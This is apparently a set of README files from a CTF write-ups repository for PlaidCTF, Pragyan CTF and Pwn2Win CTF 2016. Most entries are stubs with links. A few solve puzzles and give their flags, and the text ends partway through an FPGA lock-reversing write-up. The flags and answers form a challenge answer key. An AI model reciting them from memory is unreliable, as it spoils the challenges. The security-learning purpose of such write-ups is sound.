* [misc/plane_site-75](misc/plane_site-75)
* [misc/the-stuff-50](misc/the-stuff-50)
* [misc/hevc-50](misc/hevc-50)
* [crypto/tonnerre-300](crypto/tonnerre-300)
* [crypto/sexec-300](crypto/sexec-300)
* [crypto/radioactive-275](crypto/radioactive-275)
* [crypto/rabit-175](crypto/rabit-175)
* [pwnable/awkward-600](pwnable/awkward-600)
* [pwnable/pound-290](pwnable/pound-290)
* [pwnable/fixedpoint-175](pwnable/fixedpoint-175)
* [pwnable/unix_time_formatter-76](pwnable/unix_time_formatter-76)
* [pwnable/butterfly-150](pwnable/butterfly-150)
* [pwnable/js_sandbox-666](pwnable/js_sandbox-666)
* [web/plaiddrive-450](web/plaiddrive-450)
* [web/pixelshop-300](web/pixelshop-300)

## Missing write-ups

* [reversing/bitwise-250](reversing/bitwise-250)
* [misc/sanity-check-1](misc/sanity-check-1)
* [pwnable/pzip-400](pwnable/pzip-400)
# PlaidCTF 2016 : bitwise

**Category:** Reversing
**Points:** 250
**Solves:** 7
**Description:**

> Some people are bit-wise, but byte-foolish, you know? But I digress.


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# PlaidCTF 2016 : quick

**Category:** Reversing
**Points:** 175
**Solves:** 49
**Description:**

> Why be slow when you can be quick?

## Write-up

(TODO)

## Other write-ups and resources

* <http://p1kachu.pluggi.fr/writeup/re/2016/04/18/plaid-quick-writeup/>
* http://ctf.yeuchimse.com/plaid-ctf-2016-quick-re175/
# PlaidCTF 2016 : quite-quixotic-quest

**Category:** Reversing
**Points:** 300
**Solves:** 40
**Description:**

> Well yes, it certainly is quite quixotic. (Yes, the flag format is PCTF{} )

## Write-up

(TODO)

## Other write-ups and resources

* <https://b01lers.net/challenges/Plaid%202016/quite%20quixotic%20quest/103/>
* https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/reversing_quixotic
* http://ctf.yeuchimse.com/plaid-ctf-2016-quite-quixotic-quest-re300/
* http://blukat29.github.io/2016/04/pctf-2016-qqq/
# PlaidCTF 2016 : rage-against-the-machine

**Category:** Reversing
**Points:** 250
**Solves:** 20
**Description:**

> All this new fangled machine learning stuff is pretty cool. But sometimes something comes out and you just have no idea what it is or how it works, you know? Running at 40.117.46.42:29281 (please make sure you use tensor flow and not theano as a back-end)

## Write-up

(TODO)

## Other write-ups and resources

* <http://p1kachu.pluggi.fr/writeup/re/2016/04/18/plaid-ratm-writeup/>
# PlaidCTF 2016 : pixelshop

**Category:** Web
**Points:** 300
**Solves:** 15
**Description:**

> Everyone loves pixel art, and thanks to [PixelShop](http://pixelshop.pwning.xxx/) you can now create pixel art from your browser! Exciting!

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/web_pixelshop
# PlaidCTF 2016 : plaiddrive

**Category:** Web
**Points:** 450
**Solves:** 19
**Description:**

> Oh no! The rogue admin of [PlaidDrive](https://www.plaiddrive.com/) has a secret file flag.txt, but we can't read it. We know he reads his messages over at [Slid DMs](http://137.135.106.69:8080/), though... 
> 
> 
> UPDATE: The admin's username is "admin" on both services. 
> 
> 
> UPDATE 2: Please note the admin may be slow at reading his messages. Spamming him with the same message will only make this worse, so please do not do this.

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/tyage/a0e1c8d01b7ffad26e56293a198bef57>
# Pragyan CTF 2016 : Apple pies

**Category:** Binary-Exploitation
**Points:** 100
**Solves:** 
**Description:**

> [applepie](./applepie)  c02df758fe5d9fcbbe2ab3a859429981


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/pragyan/apple_pie.md>
# Pragyan CTF 2016 : Be the boss

**Category:** Binary-Exploitation
**Points:** 50
**Solves:** 
**Description:**

> [B_THE_B05S](./B_THE_B05S) 8e54faaeaaaf60ed04634fb03fd0bb26


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/pragyan/be_the_boss.md>
# Pragyan CTF 2016 : STDIN

**Category:** Binary-Exploitation
**Points:** 70
**Solves:** 
**Description:**

>   [stdin.exe](./stdin.exe)  e4378524a647920323a9e6669785e6de


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/pragyan/stdin.md>
# Pragyan CTF 2016 : Threes a crowd

**Category:** Binary-Exploitation
**Points:** 100
**Solves:** 
**Description:**

>  Hint! XOR
> 
>  Hint! <0,0,0> to <88,105,137>
> 
>   [threes_a_crowd](./threes_a_crowd)  5dccbbf89d139549020f8c2a7bf12afd


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : BAIL Cipher

**Category:** Cryptography
**Points:** 20
**Solves:** 
**Description:**

>  Bob and Alice have come up with a new encryption to communicate. But they want you to figure out if its possible to decipher their messages easily. Can you decipher it?
> 
> 
>  VGF4ME9GaGxnIHdXMkZqaDVlZiBzeFFtNHY5IGlsdWI=
> 
>  Hint! BAIL is made of BAse and raIL


## Write-up

BAIL Cipher itself says Base64 + Rail Cipher, So the Cipher initially given is `VGF4ME9GaGxnIHdXMkZqaDVlZiBzeFFtNHY5IGlsdWI=` , decoding it with base64 will give `Tax0OFhlg wW2Fjh5ef sxQm4v9 ilub` , Now keeping the Number of Rails = 4 , this would be the Flag `The flag is xwxlQW02mu4FOjvb9hF5`

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Decipher Me

**Category:** Cryptography
**Points:** 100
**Solves:** 
**Description:**

>  Ten years after the starship Voyager's return from the Delta Quadrant, the Federation is in a crisis. The Federation's main suppliers of dilithium crystals (the primary catalyst for the fuel used in faster-than-light travel) are disappearing. Space and time have folded around several planets, isolating them from outside contact. The phenomenon is unnatural – someone or something is causing it to happen. And all they've got is this [file](./file). Can you help the Federation ?
> 
>   [file](./file)  b7464c822fb2027935ac22237b944ae4


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : I Agree

**Category:** Cryptography
**Points:** 20
**Solves:** 
**Description:**

>  Crack the cipher: vhixoieemksktorywzvhxzijqni
> 
> 
>  Your clue is:
> 
>  "caesar is everything. But he took it to the next level."


## Write-up

From the Hint, it can be knew that it must be a Vigenere Cipher. There is Online Decipher for that: http://www.guballa.de/vigenere-solver
The solution would be `theforceisstrongwiththisone`

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Intercepted Transmission

**Category:** Cryptography
**Points:** 70
**Solves:** 
**Description:**

>  R4-D6 has intercepted an encrypted transmission from a nearby battle. You have to help him decrypt it and find the flag! R4-D6 did manage to hear a part of the transmission though "Red five standing by".
> 
>  Hint! The "red five standing by" have started to attack the forts.
> 
>   [file.wav](./file.wav)  7587e4af9bfb9a9c1b5de7635aaff70


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Kill the devil

**Category:** Cryptography
**Points:** 60
**Solves:** 
**Description:**

>  Kill the d3vil in 7he bud
>
> [Problem.txt](Problem.txt) c4c180572734214e630284d1d1476588


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Numbers and Spaces (40pts)

**Category:** Cryptography
**Points:** 40
**Solves:** 
**Description:**

>  Go for a fair consideration of the following NUMERS , but ignore the 'X's .
> 
> 
>  EPQS PODY EPQS RYNY PODY EPQS RJTCDY RYNY RJTCDY EPQS RYNY RYNY
> 
>   [morst_important.gif](./morst_important.gif)  d6920fff52658d7688586244fab7f3c7


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : RSA_Encryption

**Category:** Cryptography
**Points:** 25
**Solves:** 
**Description:**

>  X has sent a message. Can you decrypt it?
> 
>  The encrypted message and the public key used to encrypt it ( key1_data.txt ) are given to you.
> 
>   [rsaq](./rsaq)  c1a24bf093d9187955495d7577971f03


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Crack_this

**Category:** Forensics
**Points:** 50
**Solves:** 
**Description:**

>  Find the flag
> 
>   [problem](./problem)  f5d72644a54d835c92ee462bc4b9e2bd


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Johny

**Category:** Forensics
**Points:** 25
**Solves:** 
**Description:**

>  Bob recently found this old file on his old PC. Help him access it.
> 
>   [problem.zip](./problem.zip)  1e04dc669008b3c5800c009b104beb24


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Bad Habit

**Category:** Miscellaneous
**Points:** 70
**Solves:** 
**Description:**

>  " You cant get it, it's a
> 
>  A bad habit, such a
> 
>  A bad habit such a bad ba.... "
> 
>  Hint! This is raw stuff
> 
>   [the_kook-bad_habit(remix).mp3](./the_kook-bad_habit(remix).mp3)  b4668ef986f215f653be749e5a558a86


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Breaking Bar

**Category:** Miscellaneous
**Points:** 100
**Solves:** 
**Description:**

>  Walter White and Jesse Pinkman.
> 
> 
>  P.S. This question has nothing to do with "threes a crowd" question.
> 
>   [BREAKING_BAD](./BREAKING_BAD)  0b66fa45948205033321cff6d560cf57
> 
>    [file](./file)  949e77b5616ab29d516450072582eb02


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Everybody is a winner

**Category:** Miscellaneous
**Points:** 1
**Solves:** 
**Description:**

> Something to get you started off with
> 
>  [file.txt](./file.txt)  e1c9581f5eefe8d6710e5589d5da860b


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : K

**Category:** Miscellaneous
**Points:** 50
**Solves:** 
**Description:**

>  It makes you mad , doesnt it?
> 
>   [problem](./problem)  95c56713008fd486cdd4c682f013f421


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/pragyan/k.md>
# Pragyan CTF 2016 : Symphony

**Category:** Miscellaneous
**Points:** 100
**Solves:** 
**Description:**

>  Can you find the flag in this melody?
> 
>  Hint! Heard of Esoteric programming language?
> 
>   [problem.zip](./problem.zip)  d187b816ee899b434b3b3830956fe9ff


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 write-ups

* <https://ctf.pragyan.org/home>
* [Scoreboard](https://ctf.pragyan.org/scores) or [local alternative](TODOLOCAL)

## Completed write-ups

* [steganography/who-made-me-100](steganography/who-made-me-100)

## External write-ups only

* [binary-exploitation/apple-pies-100](binary-exploitation/apple-pies-100)
* [binary-exploitation/be-the-boss-50](binary-exploitation/be-the-boss-50)
* [binary-exploitation/stdin-70](binary-exploitation/stdin-70)
* [miscellaneous/k-50](miscellaneous/k-50)
* [reverse-engineering/vault-50](reverse-engineering/vault-50)

## Missing write-ups

* [binary-exploitation/threes-a-crowd-100](binary-exploitation/threes-a-crowd-100)
* [cryptography/bail-cipher-20](cryptography/bail-cipher-20)
* [cryptography/decipher-me-100](cryptography/decipher-me-100)
* [cryptography/i-agree-20](cryptography/i-agree-20)
* [cryptography/intercepted-transmission-70](cryptography/intercepted-transmission-70)
* [cryptography/kill-the-devil-60](cryptography/kill-the-devil-60)
* [cryptography/numbers-and-spaces-40](cryptography/numbers-and-spaces-40)
* [cryptography/rsa-encryption-25](cryptography/rsa-encryption-25)
* [forensics/crack-this-50](forensics/crack-this-50)
* [forensics/johny-25](forensics/johny-25)
* [miscellaneous/bad-habit-70](miscellaneous/bad-habit-70)
* [miscellaneous/breaking-bar-100](miscellaneous/breaking-bar-100)
* [miscellaneous/everybody-is-a-winner-1](miscellaneous/everybody-is-a-winner-1)
* [miscellaneous/symphony-100](miscellaneous/symphony-100)
* [reverse-engineering/smart-ass-bad-ass-great-ass-50](reverse-engineering/smart-ass-bad-ass-great-ass-50)
* [steganography/calvin-meets-a-hitchhiker-30](steganography/calvin-meets-a-hitchhiker-30)
* [steganography/harry-potter-30](steganography/harry-potter-30)
* [steganography/look-at-these-colours-40](steganography/look-at-these-colours-40)# Pragyan CTF 2016 : Smart Ass Bad Ass Great Ass :P

**Category:** Reverse-Engineering
**Points:** 50
**Solves:** 
**Description:**

>  Take a closer look
> 
>  Because the closer you look
> 
>  The lesser you see
> 
>   [image.png](./image.png)  fa2dae4f3f63fd811e827f333ab926d8


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Vault

**Category:** Reverse-Engineering
**Points:** 50
**Solves:** 
**Description:**

>  Can you help Bob find the flag?
> 
>   [source.zip](./source.zip)  996d03582d04cdfbe660449f718a17da


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/VulnHub/ctf-writeups/blob/master/2016/pragyan/vault.md>
# Pragyan CTF 2016 : Calvin Meets a Hitchhiker

**Category:** Steganography
**Points:** 30
**Solves:** 
**Description:**

>   [pctfsteg.jpg](./pctfsteg.jpg)  c05df03d466073be4c0c32c928112691


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Harry Potter

**Category:** Steganography
**Points:** 30
**Solves:** 
**Description:**

>  Look twice before you believe anything
> 
>   [HP.png](./HP.png)  8b33c88ad526b1ee5b60a294fc8e7ea9


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Look at these colours!

**Category:** Steganography
**Points:** 40
**Solves:** 
**Description:**

>  Something will catch your attention.
> 
>   [landscape.png](./landscape.png)  e2af5e3968f40bc36e7477bc807a8396


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pragyan CTF 2016 : Who made me?

**Category:** Steganography
**Points:** 100
**Solves:** 
**Description:**

>   [pixels.jpg.pkl](./pixels.jpg.pkl)  f93b0738aa7746a512bdf2444b83a19b


## Write-up

Writeup by [CeSeNA](https://github.com/cesena)

We have an ASCII text which contains about 10 thousand of lines and at line 2 we read: `S'The black pixels of a b/w image are at'`.

The file seems to have a pattern:
~~~
a(I15
I200
tp2
a(I21
I308
~~~
and so on.

This kind of pattern is a serialized python object: using `pickle` we obtain a list of tuble.
~~~
[(15, 200), (21, 308), (23, 310), (24, 314), (25, 308), (25, 318), (25, 431), (25, 441), ...
~~~

The comment at start suggests to create a blank image where the tuples are the black pixels:

![Result](Result.jpg)

~~~python
import pickle
from PIL import Image

with open('pixels.jpg.pkl') as f:
	data = pickle.loads(f.read().encode('utf8'))

white_pixels = [(int(e[0]), int(e[1])) for e in data[1:]]
width  = max([p[0] for p in white_pixels]) + 10
height = max([p[1] for p in white_pixels]) + 10

image  = Image.new('1', (width, height), 0)
pixels = image.load()

for pixel in white_pixels:
	pixels[pixel[0], pixel[1]] = 255
	
image.show()
~~~

`Who made me?`: the author of 'Calvin and Hobbes' comic is 'Bill Watterson' and the flag is `billwatterson`

## Other write-ups and resources
# Pwn2Win CTF : simple-cryptography-60

**Category:** Crypto
**Points:** 60
**Solves:** 
**Description:**
The club decided to evolve the security of communication for something more efficient and simple to be implemented … simply too much!

## Write-up

(TODO)

## Other write-ups and resources

* https://www.xil.se/post/pwn2win-2016-simple-crypto-rspkt/
# Pwn2Win CTF : electronic-ballot-box-prototype-50

**Category:** Electronics
**Points:** 50
**Solves:** 
**Description:**
A member of Project SKY has infiltrated into a Club recycling facility and got access to one of the first prototypes of what became, afterwards, an electronic ballot box (yes, all of this has been born because of the influence of the Club). We know that the prototype has the potential to unveil the true inner workings behind electronic voting, but we need your help. Add CTF-BR{} around the flag before submitting it.


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/tree/master/2016-03-26-pwn2win/electronic_ballot_box_prototype
# Pwn2Win CTF : dump-50

**Category:** Forensic
**Points:** 50
**Solves:** 
**Description:**
We know this dump was generated by a process which was executing as root in the computer, and that it was reading directly from a /dev device. Probably it is part of a keylogger module included in a rootkit which is being tested by the Club. Help us to unveil this message, allowing us to discover why they infected this specific machine.

Submit the flag in the format: CTF-BR{message}


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/tree/master/2016-03-26-pwn2win/dump
* https://www.xil.se/post/pwn2win-2016-dump-rspkt/
# Pwn2Win CTF : hidden-in-plain-sight-40

**Category:** Forensic
**Points:** 40
**Solves:** 
**Description:**
tl;dr read the file before it's been decrypted


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/blob/master/2016-03-26-pwn2win/hidden_in_plain_sight/README.md
# Pwn2Win CTF : painel-message-50

**Category:** Forensic
**Points:** 50
**Solves:** 
**Description:**
The last month we gained access to a video portraying a Club’s electronics project. It looks like they want to insert this display into the the digital panels found in urban buses that circulate in large cities. We need to discover what this is all about.


## Write-up

(TODO)

## Other write-ups and resources

* https://www.xil.se/post/pwn2win-2016-painel-message-rspkt/
# Pwn2Win CTF : samuel-riff-breese-80

**Category:** Forensic
**Points:** 80
**Solves:** 
**Description:**
We are presented with a PNG image file which is hidding top secret informations from mister Riff.


## Write-up

(TODO)

## Other write-ups and resources

* https://0x90r00t.com/2016/03/28/pwn2win-2016-forensics-80-samuel-riff-breese-write-up/
# Pwn2Win CTF : access-code-100

**Category:** Networking
**Points:** 100
**Solves:** 
**Description:**
SkySoldier86 analyzed the leaked e-mails from the Hacking Team, and has found out that the Club has hired them back in 2014 to develop a new authentication system to their secret servers, Method based in client/server. We managed to access the ‘prototype’ of the server, that apparently it’s finished, but not the client. Your mission is to unveil how it works, for it will be very useful in the future.

nc access.pwn2win.party 8111


## Write-up

(TODO)

## Other write-ups and resources

* https://ctf.rip/pwn2win-ctf-2016-access-code-100-point-network-challenge/
# Pwn2Win CTF : death-sequence-100

**Category:** Ppc
**Points:** 100
**Solves:** 
**Description:**
Networking

openssl s_client -connect programming.pwn2win.party:9001


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/blob/master/2016-03-26-pwn2win/death_sequence/README.md
* https://github.com/raccoons-team/ctf/tree/master/2016-03-28-pwn2win/death_sequence_100
# Pwn2Win CTF : iMathze

**Category:** Ppc
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/tree/master/2016-03-26-pwn2win/imathz
# Pwn2Win CTF : qrgrams

**Category:** Ppc
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://www.xil.se/post/pwn2win-2016-qrgrams-kbeckmann/
# Pwn2Win CTF : sequences-50

**Category:** Ppc
**Points:** 40
**Solves:** 
**Description:**
Warm up for the next PPC challenges. The Club guys love sequences, and it is always good to know your enemy.



## Write-up

(TODO)

## Other write-ups and resources

* https://www.xil.se/post/pwn2win-2016-sequences-rspkt/
# Pwn2Win CTF : square-infinite-spiral

**Category:** Ppc
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://www.xil.se/post/pwn2win-2016-spiral-kbeckmann/
# Pwn2Win CTF : secret-accounts-80

**Category:** Pwn
**Points:** 80
**Solves:** 
**Description:**
Through many months of sniffing, we discovered a server running a software which the Club uses to manage information about secret bank accounts abroad. We even obtained its source code. We need to obtain access to the system in order to discover the real name of the owner of the account possessing the greater amount of money, in which bank it is, and the real amount. As you might expect, it seems that the Club has hunkered down to assert only authorized people, which really know what they are doing, are able to operate this system and to interpret information provided by it. Rumors exist that the Mentor himself manages it, as amazing as it may seem (he is old but not deciduous!).

You will need good “python-fu” to win this challenge!

Submit the flag in the following format: CTF-BR{info1_info2_info3}.

Hint: Who is Fideleeto (Cuba!) in real life? Take this into account. :)



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/tree/master/2016-03-26-pwn2win/secret_account
* https://www.xil.se/post/pwn2win-2016-secret-accounts-rspkt/
# Pwn2Win CTF write-ups

* [https://pwn2win.party](https://pwn2win.party)
* [Scoreboard](https://pwn2win.party/game/scoreboard) or [local alternative](scoreboard)

## Repo-local write-ups

* [reverse/timekeeperslock-600](reverse/timekeeperslock-600)
* [web/bathing-and-grooming-400](web/bathing-and-grooming-400)

## External write-ups only

* [Dragon Sector write-ups](http://dragonsector.pl/docs/pwn2win2016_writeups.pdf)

## Missing write-ups

(TODO)
# Pwn2Win CTF : auswaehlen-120

**Category:** Reverse
**Points:** 120
**Solves:** 
**Description:**
The Club conducts a rigid and cruel training with their future agents. An exam is applied in which the student needs to stay awaken and concentrated during 72h looking to a computer screen. Everytime an asterisk appears in the screen, he needs to press the RETURN key within one second. The student doesn’t know if he was able to comply with the reaction time required by the exam until the end of those 72h, increasing his anxiety and psychological pressure level. Elapsed the 72h, the student receives an approval flag if he succeeded. Otherwise, all of its vital life is absorbed by the Club leaders, producing an slow and painful death.


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/epicleet/write-ups-2016/tree/pwn2win-ctf-2016/pwn2win-ctf-2016/reverse/Auswahlen-120
# Pwn2Win CTF : sleeper-cell-70

**Category:** Reverse
**Points:** 70
**Solves:** 
**Description:**
The challenge was to reverse a binary (ELF 64-bit) and find the right input.




## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/rick2600/writeups/blob/master/pwn2win-2016/sleeper_cell.md
* https://www.xil.se/post/pwn2win-2016-sleeper-cell-kbeckmann/
# Pwn2Win CTF : suspect-router-100

**Category:** Reverse
**Points:** 100
**Solves:** 
**Description:**
We have found this suspect binary in one of the SKY project routers. We suspect that the Club installs this binary to mark the enemy networks intruded by them, and that hidden information exists inside the binary which can be obtained via network. Find which information is that.


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/epicleet/write-ups-2016/tree/pwn2win-ctf-2016/pwn2win-ctf-2016/reverse/suspect-router-100
# Pwn2Win CTF : bitfile

**Category:** Reverse
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pwn2Win CTF : fig

**Category:** Reverse
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Pwn2Win CTF 2016: Timekeeper's Lock

**Category:** Reverse
**Points:** 600
**Solves:** 0
**Description:**

> In order to protect their maximum security facilities, the Club employs
> an electronic security lock activated by a 256-bit key which changes every
> minute. When a Club member is authorized to enter some of these facilities,
> he receives this key in hexadecimal format, the same format which is used to
> enter the key in the electronic lock’s keyboard. The last year (in 2015),
> Project SKY intercepted a key valid for April 1st at 11:00 UTC:
> 01cd9de119e1231e29b0972a618da6c79fc1f3bd96cee86c93a8068bdc5e4c59,
> however we got access to this key only after it was already expired.
> It seems that these keys are the same for all facilities, independent from
> their geographical location, that is, they vary only with time. This year,
> our truck driver Alisson, undercover in the Club’s fleet, was able to
> intercept the shipment of one of these locks to a warehouse which is
> currently under construction. Quickly, he drafted a block diagram of
> the lock’s circuit and generated a dump of the flash memory (N25Q032A),
> both contained in the file which we are providing to you. A few minutes
> after sending this information through 3G using his Samsung Note Edge™
> smartphone, Alisson suffered a tragic transit accident, which means
> the Club has probably discovered our plans, so that we have only 48h before
> they change all of their electronic lock scheme. Our teams are ready to
> deploy next to 3 facilities of critical importance to the Club. They only
> need that you send a key valid for the current minute to the address
> https://door.pwn2win.party/KEY.

![Electronic lock system](fig/BlockDiagram.png)


## Write-up

### Preparing the environment

Some tools and libraries must be installed in order to run this write-up.

 * Download and build [IceStorm](https://github.com/cliffordwolf/icestorm).

```
sudo apt-get install libftdi-dev
mkdir -p ~/git; cd ~/git
git clone https://github.com/cliffordwolf/icestorm.git
cd icestorm
git checkout -b ctf eb85e29ff0ca7b9031cf21db3dccaa70b7ef567a
make CXX=g++
```

 * Set the `ICESTORM` environment variable to the IceStorm repository path.

```
export ICESTORM=$HOME/git/icestorm
```

 * Install [Verilator](http://www.veripool.org/wiki/verilator).

```
sudo apt-get install verilator
```

 * Install [Python 3](https://www.python.org).

```
sudo apt-get install python3
```


### Reversing the FPGA bitfile

We have chosen the iCE40HX8K-CT256 chip to implement this challenge because mature and modern reverse engineering tools are available for it.

The `iceunpack` and `icebox_vlog.py` tools from [IceStorm](https://github.com/cliffordwolf/icestorm) are able to transform the FPGA bitfile into an equivalent circuit in Verilog RTL.

This write-up provides a Makefile target to run these tools. Just type:

```
make chip.v
```


### Simulating the circuit given an input

First, the competitor was expected to set up a working simulation of the FPGA circuit. We provided the sample key mainly to allow such a simulation to be more easily validated, as our circuit has no output pins for flagging errors such as malformed UART signals or NMEA sentences.

The circuit could be simulated with any Verilog simulator, in particular free-software ones, such as [iverilog](http://iverilog.icarus.com) and [verilator](http://www.veripool.org/wiki/verilator). However, iverilog is very slow for simulating such a large and complex (decomposed) circuit. A single simulation takes near 2 minutes to run on iverilog in modern hardware. On the other hand, verilator is pretty fast, and runs the same simulation in 3 seconds. Another advantage of verilator is that it allows every internal digital signal to be easily controlled by C++ code during the simulation.

In order to correctly control the input pins, the competitor must be able to compute the duration, in number of cycles, of each bit sent over UART (29.4912×10⁶ / 115200 = 256) and to correctly generate the 8N1 framing.

In this write-up, we simulate the circuit with verilator. A Makefile target is available for building the simulator executables. Compile the `sim_input` simulator by typing:

```
make sim_input
```

Pass the Keypad and GPS UART inputs as arguments to `sim_input`. It can also optionally receive a third argument to save a waveform dump to a file. At the end of simulation, it outputs `lock: 1` if the door is open, or `lock: 0` if it is closed.

```
$ ./sim_input 01cd9de119e1231e29b0972a618da6c79fc1f3bd96cee86c93a8068bdc5e4c59 \
  '$GPRMC,110000.000,A,1547.9730,S,4751.8510,W,0.02,31.66,010415,,,A*61' \
  dump.vcd
lock: 1
```

The waveform dump can be opened with [GTKWave](http://gtkwave.sourceforge.net).

```
gtkwave dump.vcd
```

### Observing the waveforms

![Waveform overview](fig/gtkwave_overview.png)

By observing the waveform dump above, several interesting remarks can be made:

 * Signal `n2` pulses 10 times. If we observe the pulse position relative to the NMEA UART signal (`pin_E6`), we discover that the first 4 pulses occur at the stop bit of each character pertaining to the current time (hour and minute) in a `$GPRMC` sentence. Similarly, the last 6 pulses occur at the stop bit of each character belonging to the current date (day, month and year).

 * Signal `n6` pulses 64 times. Each pulse occurs at the stop bit of a hexadecimal digit character received from the keypad (`pin_G13`).

 * Most signals (`n8`–`n14`, `n17`, `n19`–`n23`, `n26`, and several others if we scroll down) only present activity (toggling) during a short period of time after both UARTs have finished receiving their data. Therefore these signals are probably related to key calculation.

![Zoom around the time the door opens](fig/gtkwave_zoom_n4.png)

By zooming around the time when the door opens (`pin_B4` becomes high), we can make additional remarks:

 * Signal `n4` only becomes high for 4 cycles, just before the door opens.

 * Even more evidence shows that `n8`–`n14` and others are related to key calculation, as their toggle rate is quite high (near clock speed), and all activity ceases just before the circuit decides to open the door.


### Gathering information about registers

By typing:

```
make reginfo.h
```

Our Makefile runs a very simple parser which gathers a list of all the registers present in the `chip.v` file and their enable signals. The script also prints the table below.

| Enable signal | Number of registers |
|---------------|---------------------|
| `1'b1`        | 1762                |
| `n1`          | 50                  |
| `n145`        | 10                  |
| `n2`          | 48                  |
| `n4`          | 256                 |
| `n4357`       | 1 (`pin_B4`)        |
| `n4457`       | 1 (`n4456`)         |
| `n6`          | 256                 |

Taking into account the behavior observed for the enable signals in the simulation waveforms and the fact that the size of the key is 256 bits, the table above provides evidence that:

 * Registers enabled by signal `n6` probably hold the key typed in the keypad, as this signal is activated on each keystroke.

 * Registers enabled by signal `n4` might hold the correct key, as they only change (and rapidly stabilize) immediately before the door opens.


### Locating keypad registers

Although at this point we have evidence that registers enabled by `n6` hold the key typed in the keypad, important issues remain:

 * The key might have suffered some transformation before being stored in the registers. We still cannot be sure that the key is stored exactly as typed.

 * Even if the key is stored exactly as typed, simply knowing which are the members of the unordered set of 256 registers does not help much, since they can be ordered in any of 256! possible permutations.

If the key is transformed at most in a linear way after typed, it should be possible to activate each bit of the key at a time and afterwards study the change it causes in registers.

Typing the command below will employ this approach to map which registers become high when each bit of the key is set to high.

```
make -j8 keypad_regs.h
```

Looking at the results, we can conclude that:

 * The key is stored exactly as typed. Each bit of the key is tied to a single register enabled by `n6` and vice-versa.

 * The 4 least significant bits of the key affect, besides their respective `n6`-enabled register, also a single register enabled by `1'b1`. These probably form a buffer which stores the last typed hexadecimal digit, but this hypothesis is not needed to solve the challenge.


### Analyzing registers affected by NMEA input

If the correct key is computed as a cryptographically-secure hash from the current date and time provided by NMEA, we expect that after each minute, a 50% probability exists of each bit of the key being flipped.

This fact can be exploited to gain more confidence that registers enabled by `n4` hold the correct key. Below, we simulate the circuit receiving some random initial date and time, take a snapshot of the register values, then simulate again 11 times, each one incrementing the time by one minute. Finally, we plot how many registers flipped at least once across the snapshots taken after each simulation.

![Registers enabled by n4 affected by change in time](fig/hash_regs_n4.svg)

Above we observe that, given enough time, every register enabled by `n4` will eventually have changed at least once. As we know the size of the key is 256 bits, then the registers enabled by `n4` are rather suspicious of holding the correct key.

![Registers enabled by 1'b1 affected by change in time](fig/hash_regs_always.svg)

Besides registers enabled by `n4`, the only others affected by a change in date and time (when other inputs are fixed) are a subset of the registers enabled by `1'b1` (above). Going further, although not required to solve the challenge, we can hypothesize that they hold the hash algorithm's internal state. Looking at the size of this internal state, if we knew the circuit implements a [NIST-approved hash algorithm](https://en.wikipedia.org/wiki/Template%3AComparison%5Fof%5FSHA%5Ffunctions), we could even deduce it was SHA-3. ;)

### Reproducing the plots

If you intend to plot the figures above, first install the following scientific libraries for Python 3:

```
sudo apt-get install python3-matplotlib python3-scipy python3-pip
sudo -H python3 -m pip install lmfit
```

Then run the corresponding Makefile target for each figure.


### Obtaining the key

Now that we got an overview of the circuit's behavior, we shall present two different ways to solve the challenge.


#### The Trickster's Way

If we assume the correct key is stored in the unordered set of registers enabled by `n4`, the same issues we encountered when locating keypad registers arise again. The key bits might be ordered in any of the 256! possible permutations. Brute-forcing the correct order is computationally infeasible. Therefore, we need to find an efficient way to sort the key bits.

